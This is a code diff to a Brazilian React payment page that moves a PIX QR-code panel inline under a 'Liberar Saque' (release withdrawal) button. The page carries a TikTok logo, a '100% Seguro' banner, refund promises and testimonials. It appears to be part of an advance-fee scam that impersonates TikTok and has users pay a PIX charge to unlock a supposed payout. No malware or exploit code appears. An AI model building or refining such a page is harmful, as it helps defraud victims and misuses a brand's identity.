@@ -108,65 +108,6 @@ const Pagamento = () => {
 
   const isFormValid = email.trim() && nomeCompleto.trim();
 
-  // Show QR code screen after payment generated
-  if (pixData) {
-    return (
-      <div className="flex min-h-screen flex-col bg-gray-50">
-        <div className="bg-primary py-3 text-center">
-          <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
-        </div>
-        <div className="px-4 py-6 space-y-5 max-w-md mx-auto w-full">
-          <div className="flex justify-center">
-            <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
-          </div>
-
-          <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
-            <CheckCircle2 className="h-10 w-10 text-green-500 mx-auto" />
-            <h2 className="text-lg font-bold text-black">PIX Gerado com Sucesso!</h2>
-            <p className="text-sm text-gray-500">Escaneie o QR Code ou copie o código abaixo</p>
-
-            {pixData.qr_code_base64 && (
-              <div className="flex justify-center">
-                <img
-                  src={pixData.qr_code_base64}
-                  alt="QR Code PIX"
-                  className="w-48 h-48 rounded-xl"
-                  loading="eager"
-                  decoding="async"
-                />
-              </div>
-            )}
-
-            <div className="bg-gray-50 rounded-xl p-3">
-              <p className="text-[10px] text-gray-400 mb-1">Código PIX Copia e Cola</p>
-              <p className="text-xs text-black font-mono break-all leading-relaxed">
-                {pixData.qr_code.substring(0, 80)}...
-              </p>
-            </div>
-
-            <Button
-              onClick={handleCopyPix}
-              className="w-full h-12 rounded-2xl text-sm font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
-            >
-              {copied ? (
-                <>
-                  <Check className="h-4 w-4 mr-2" /> Copiado!
-                </>
-              ) : (
-                <>
-                  <Copy className="h-4 w-4 mr-2" /> Copiar Código PIX
-                </>
-              )}
-            </Button>
-
-            <p className="text-xs text-gray-400">
-              Após o pagamento, a confirmação é automática em até 2 minutos.
-            </p>
-          </div>
-        </div>
-      </div>
-    );
-  }
 
   return (
     <div className="flex min-h-screen flex-col bg-gray-50">
@@ -248,24 +189,65 @@ const Pagamento = () => {
                 <p className="text-xs text-gray-400">Reembolso imediato.</p>
               </div>
             </div>
-            
           </div>
         </div>
 
         {/* Pagar button */}
         <Button
           onClick={handlePagar}
-          disabled={!isFormValid || loading}
+          disabled={!isFormValid || loading || !!pixData}
           className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40"
         >
           {loading ? (
             <>
               <Loader2 className="h-5 w-5 mr-2 animate-spin" /> Gerando PIX...
             </>
+          ) : pixData ? (
+            "PIX Gerado ✓"
           ) : (
             "Liberar Saque"
           )}
         </Button>
+
+        {/* Inline QR Code */}
+        {pixData && (
+          <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
+            <CheckCircle2 className="h-10 w-10 text-green-500 mx-auto" />
+            <h2 className="text-lg font-bold text-black">PIX Gerado com Sucesso!</h2>
+            <p className="text-sm text-gray-500">Escaneie o QR Code para pagar</p>
+
+            {pixData.qr_code_base64 && (
+              <div className="flex justify-center">
+                <img
+                  src={pixData.qr_code_base64}
+                  alt="QR Code PIX"
+                  className="w-48 h-48 rounded-xl"
+                  loading="eager"
+                  decoding="async"
+                />
+              </div>
+            )}
+
+            <Button
+              onClick={handleCopyPix}
+              className="w-full h-12 rounded-2xl text-sm font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
+            >
+              {copied ? (
+                <>
+                  <Check className="h-4 w-4 mr-2" /> Copiado!
+                </>
+              ) : (
+                <>
+                  <Copy className="h-4 w-4 mr-2" /> Copiar Código PIX
+                </>
+              )}
+            </Button>
+
+            <p className="text-xs text-gray-400">
+              Após o pagamento, a confirmação é automática em até 2 minutos.
+            </p>
+          </div>
+        )}
 
 
         {/* Testimonials */}
